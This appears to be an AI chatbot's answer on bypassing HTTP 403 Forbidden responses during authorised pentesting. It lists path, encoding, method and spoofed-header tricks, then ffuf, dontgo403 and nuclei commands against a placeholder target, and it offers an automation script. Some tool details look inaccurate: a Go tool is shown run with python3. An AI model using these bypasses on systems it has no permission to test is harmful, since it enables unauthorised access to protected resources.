# 403-Forbidden

Good question 👍 — a **403 Forbidden** response just means “the server understood your request, but refuses to authorize it.”
It doesn’t always mean a vulnerability; sometimes it’s just normal access control (e.g., admin panels, private APIs).

For **security testing in bug bounty or pentesting (with permission!)**, testers often try **403 bypass techniques** to check if misconfigurations allow access. Here are common approaches:

---

## 🔑 403 Bypass Techniques

### 1. **Path Obfuscation Tricks**

Sometimes web servers or WAFs only block exact paths, not variations:

* Add a slash:

  ```
  /admin → /admin/
  ```
* Add a dot:

  ```
  /admin → /admin.
  ```
* Double slashes:

  ```
  /admin → //admin
  ```
* Case changes:

  ```
  /Admin, /ADMIN
  ```
* URL encoding:

  ```
  /admin → /%61dmin
  ```

---

### 2. **HTTP Method Switching**

* If `GET` is blocked, try:

  ```
  POST /admin
  HEAD /admin
  OPTIONS /admin
  ```

---

### 3. **Header Manipulation**

Sometimes adding headers tricks the server or upstream proxy:

* Spoof client IP:

  ```
  X-Forwarded-For: 127.0.0.1
  X-Forwarded-Host: localhost
  X-Original-URL: /admin
  ```
* Common bypass headers:

  ```
  X-Client-IP: 127.0.0.1
  X-Host: localhost
  X-Forwarded-For: yourIP
  ```

---

### 4. **Bypass via Encodings**

* URL double-encoding:

  ```
  /%252e%252e/ (instead of ../)
  ```
* UTF-8 tricks:

  ```
  /adm%C4%B1n   (Turkish “ı” instead of i)
  ```

---

### 5. **Use of Proxies / Alternate Hosts**

* Try accessing via different subdomain:

  ```
  api.target.com/admin
  dev.target.com/admin
  ```
* Use CDN/WAF bypass with direct IP (if real IP found).

---

### 6. **Parameter Pollution**

* Add random query params to bypass WAF rules:

  ```
  /admin?auth=1
  /admin?x=
  ```

---

### 7. **Case: Misconfigured .htaccess / Nginx**

* Try appending file extensions:

  ```
  /admin.php
  /admin.json
  /admin;/ (semicolon trick in Apache)
  ```

---

---

## 🔧 Automation Tools for 403 Bypass

### 1. **ffuf** (Fast Fuzzer)

Super fast tool for fuzzing paths/headers.

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Fuzzing/403-bypass.txt
```

* You can fuzz **paths** (slashed, dots, encodings, etc.).
* Can also fuzz headers with `-H`.

---

### 2. **403-bypass-tools**

Open-source tools that try known tricks.

* Example: [t3l3machus/403-bypass](https://github.com/t3l3machus/403-bypass)

```bash
python3 bypass-403.py -u https://target.com/admin
```

This will try headers + encoding automatically.

---

### 3. **dontgo403**

Python tool specifically made for 403 bypass.

```bash
git clone https://github.com/devploit/dontgo403
cd dontgo403
python3 dontgo403.py -u https://target.com/secret
```

* Tries path obfuscation + headers.
* Very effective for quick checks.

---

### 4. **XSStrike / Arjun** (for hidden params)

Sometimes access control is tied to parameters:

```bash
python3 arjun.py -u https://target.com/admin
```

Finds hidden query params → then you fuzz with 403 bypass tricks.

---

### 5. **Nuclei Templates**

Nuclei has ready-made templates for 403 bypass.

```bash
nuclei -u https://target.com -t cves/ -tags 403,bypass
```

---

## ⚡️ Example Workflow (Automated 403 Bypass)

1. **Check real response** with curl:

   ```bash
   curl -i https://target.com/admin
   ```
2. **Run dontgo403**:

   ```bash
   python3 dontgo403.py -u https://target.com/admin
   ```
3. **Run ffuf with wordlists**:

   ```bash
   ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Fuzzing/403-bypass.txt
   ```
4. **Run nuclei with bypass templates**.

---

👉 Do you want me to write you a **bash script** that runs `dontgo403`, `ffuf`, and `nuclei` automatically against a URL and saves results neatly (like `/out/bypass-results.txt`)?

